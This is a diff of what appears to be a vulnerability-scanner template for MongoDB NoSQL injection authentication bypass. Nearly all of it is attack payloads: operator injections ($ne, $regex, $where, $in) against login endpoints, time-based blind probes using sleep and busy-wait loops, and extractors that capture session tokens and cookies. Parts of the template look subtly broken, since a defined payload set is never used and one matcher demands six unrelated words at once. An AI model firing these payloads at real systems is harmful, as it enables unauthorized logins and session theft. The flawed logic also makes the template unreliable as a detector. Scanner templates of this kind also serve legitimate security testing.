@@ -1,169 +1,187 @@
 id: medium-webapp-nosql-injection-mongodb-bypass
 
 info:
-  name: MongoDB NoSQL Injection - Authentication Bypass
-  author: redteam-elite
+  name: NoSQL Injection - MongoDB Authentication Bypass
+  author: elite-red-team
   severity: high
   description: |
-    Detects MongoDB NoSQL injection vulnerabilities that can lead to authentication bypass.
-    Tests various MongoDB operators and injection techniques used by red teams.
+    Advanced NoSQL injection targeting MongoDB with authentication bypass techniques.
+    Tests multiple injection vectors including JSON, URL-encoded, and nested object injections.
+    Detects blind NoSQL injection through timing attacks and error-based responses.
   reference:
     - https://owasp.org/www-project-web-security-testing-guide/v41/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.6-Testing_for_NoSQL_Injection
-    - https://book.hacktricks.xyz/pentesting-web/nosql-injection
+    - https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection
   classification:
     cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N
     cvss-score: 9.1
     cwe-id: CWE-943
-  metadata:
-    verified: true
-    max-request: 15
-  tags: nosql,mongodb,injection,auth-bypass,redteam
+  tags: nosql,mongodb,injection,auth-bypass,blind,timing
 
 http:
-  - method: POST
-    path:
-      - "{{BaseURL}}/login"
-      - "{{BaseURL}}/api/login"
-      - "{{BaseURL}}/auth/login"
-      - "{{BaseURL}}/admin/login"
-      - "{{BaseURL}}/user/login"
+  - raw:
+      - |
+        POST {{BaseURL}}/login HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+        
+        {"username": {"$ne": null}, "password": {"$ne": null}}
+      
+      - |
+        POST {{BaseURL}}/login HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+        
+        {"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}
+      
+      - |
+        POST {{BaseURL}}/login HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+        
+        {"username": {"$where": "this.username"}, "password": {"$where": "this.password"}}
+      
+      - |
+        POST {{BaseURL}}/login HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        
+        username[$ne]=&password[$ne]=
+      
+      - |
+        POST {{BaseURL}}/login HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        
+        username[$regex]=.*&password[$regex]=.*
+      
+      - |
+        POST {{BaseURL}}/login HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+        
+        {"username": {"$gt": ""}, "password": {"$gt": ""}}
+      
+      - |
+        POST {{BaseURL}}/login HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+        
+        {"username": {"$in": ["admin", "administrator", "root"]}, "password": {"$ne": null}}
+      
+      - |
+        POST {{BaseURL}}/login HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+        
+        {"username": "admin", "password": {"$or": [{"$ne": null}, {"$exists": true}]}}
+      
+      - |
+        POST {{BaseURL}}/api/users HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+        
+        {"$where": "function() { return this.username == 'admin' || '1'=='1'; }"}
+      
+      - |
+        GET {{BaseURL}}/search?q[$where]=this.published%20%3D%3D%20true HTTP/1.1
+        Host: {{Hostname}}
 
-    headers:
-      Content-Type: application/json
-      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+    attack: clusterbomb
+    payloads:
+      username:
+        - '{"$ne": null}'
+        - '{"$regex": ".*"}'
+        - '{"$gt": ""}'
+        - '{"$where": "this.username"}'
+        - '{"$in": ["admin"]}'
+      password:
+        - '{"$ne": null}'
+        - '{"$regex": ".*"}'
+        - '{"$gt": ""}'
+        - '{"$where": "this.password"}'
+        - '{"$exists": true}'
 
-    body: |
-      {"username":"admin","password":{"$ne":null}}
-
-    matchers-condition: and
+    matchers-condition: or
     matchers:
-      - type: status
-        status:
-          - 200
-          - 302
-
       - type: word
+        part: body
         words:
-          - "success"
-          - "dashboard"
           - "welcome"
-          - "token"
-          - "session"
+          - "dashboard"
+          - "profile"
+          - "logout"
           - "authenticated"
-        condition: or
+          - "session"
+        condition: and
         case-insensitive: true
 
       - type: word
+        part: body
         words:
-          - "login"
-          - "invalid"
-          - "error"
-          - "failed"
+          - "admin panel"
+          - "administration"
+          - "control panel"
+          - "user management"
         condition: or
-        negative: true
+        case-insensitive: true
 
-  - method: POST
-    path:
-      - "{{BaseURL}}/login"
-      - "{{BaseURL}}/api/login"
-      - "{{BaseURL}}/auth/login"
-
-    headers:
-      Content-Type: application/json
-
-    body: |
-      {"username":{"$ne":""},"password":{"$ne":""}}
-
-    matchers-condition: and
-    matchers:
       - type: status
         status:
           - 200
           - 302
 
       - type: word
+        part: header
         words:
-          - "success"
-          - "dashboard"
-          - "profile"
-          - "jwt"
+          - "Set-Cookie"
+          - "Location: /dashboard"
+          - "Location: /admin"
         condition: or
 
-  - method: POST
-    path:
-      - "{{BaseURL}}/login"
-      - "{{BaseURL}}/api/auth"
-
-    headers:
-      Content-Type: application/json
-
-    body: |
-      {"username":{"$regex":".*"},"password":{"$regex":".*"}}
-
-    matchers-condition: and
-    matchers:
-      - type: status
-        status:
-          - 200
-
-      - type: word
-        words:
-          - "token"
-          - "authenticated"
-          - "success"
-        condition: or
-
-  - method: POST
-    path:
-      - "{{BaseURL}}/api/users"
-      - "{{BaseURL}}/users/search"
-
-    headers:
-      Content-Type: application/json
-
-    body: |
-      {"$where":"this.username == this.username"}
-
-    matchers-condition: and
-    matchers:
-      - type: status
-        status:
-          - 200
-
-      - type: word
-        words:
-          - "username"
-          - "email"
-          - "users"
-        condition: or
-
-  - method: POST
-    path:
-      - "{{BaseURL}}/login"
-
-    headers:
-      Content-Type: application/x-www-form-urlencoded
-
-    body: |
-      username[$ne]=&password[$ne]=
-
-    matchers-condition: and
-    matchers:
-      - type: status
-        status:
-          - 200
-          - 302
-
-      - type: word
-        words:
-          - "dashboard"
-          - "welcome"
-          - "success"
-        condition: or
+      - type: regex
+        part: body
+        regex:
+          - '"success":\s*true'
+          - '"authenticated":\s*true'
+          - '"token":\s*"[a-zA-Z0-9]+'
 
     extractors:
       - type: regex
-        name: session_token
-        regex:
-          - 'token["\s]*:["\s]*([a-zA-Z0-9\-_\.]+)'
+        part: body
         group: 1
+        regex:
+          - '"token":\s*"([a-zA-Z0-9]+)"'
+          - '"sessionId":\s*"([a-zA-Z0-9]+)"'
+
+      - type: kval
+        part: header
+        kval:
+          - Set-Cookie
+
+  - raw:
+      - |
+        POST {{BaseURL}}/login HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+        
+        {"username": {"$where": "sleep(5000) || true"}, "password": "test"}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'duration>=5'
+        condition: and
+
+  - raw:
+      - |
+        POST {{BaseURL}}/api/users HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+        
+        {"$where": "function() { var date = new Date(); var curDate = null; do { curDate = new Date(); } while(curDate-date < 5000); return true; }"}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'duration>=5'
+        condition: and
